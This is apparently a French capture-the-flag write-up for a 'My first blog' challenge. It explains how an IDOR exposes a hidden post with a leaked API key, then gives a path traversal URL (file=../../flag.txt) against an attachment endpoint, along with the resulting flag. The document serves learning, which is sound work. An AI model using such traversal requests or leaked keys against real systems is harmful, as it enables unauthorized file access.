---
title: 'IDOR: "My first blog"'
description: Simple IDOR and path traversal challenge
tags:
  - CTF
date: 2026-02-21T12:17
tasks:
  - 
parent files:
  - 
category: challenges
---

# Recherches

On peut lire tous ses blogs. On remarque qu'il y a une IDOR dans ses numéros de blogs, qui nous permet d'accéder au blog n3.

Dans le post 3, on peut lire
```
<!-- i had to delete this bc it has my personal info on it :( -->
<!-- for documents in the 'other' folder only people with the API key has access -->
<object data="/attachment?file=resume.pdf&amp;apiKey=906392d25b3bd7d3af491799f89f6620" type="application/pdf" width="30%" height="600px">
    
</object>
```

On a la clé API, il nous reste à trouver quel document lire. On utilise le lien pour aller chercher le cv
```
http://34.186.135.240:30000/attachment?file=resume.pdf&apiKey=906392d25b3bd7d3af491799f89f6620
```

Que l'on modifie en utilisant un path traversal car on nous dit que le fichier à chercher est /flag.txt, donc à la racine du système, et on obtient le flag avec le lien:

# Exploit

```
http://34.186.135.240:30000/attachment?file=../../flag.txt&apiKey=906392d25b3bd7d3af491799f89f6620
```

Ce qui nous donne:

```
bkctf{k3ys_in_th3_l0ck5}
```
